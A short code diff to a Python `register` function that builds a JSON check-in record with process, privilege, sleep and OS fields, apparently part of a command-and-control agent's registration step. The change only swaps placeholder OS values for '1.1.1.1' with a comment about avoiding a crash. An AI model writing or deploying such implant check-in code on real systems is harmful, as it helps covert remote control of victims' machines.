@@ -98,10 +98,10 @@ def register(issue_number):
     "Process Parent ID": "0",
     "Process Arch": "x64",
     "Process Elevated": 0,
-    "OS Build":  "qsddq",
+    "OS Build":  "1.1.1.1", # to evade crash
     "Sleep": 1,
     "Process Name": os.path.basename(sys.executable),
-    "OS Version":  "qsdqsd"
+    "OS Version":  "1.1.1.1", # to evade crash
     }
     registerblob = json.dumps(registerdict)
     requestdict = {"task":"register","data":registerblob}
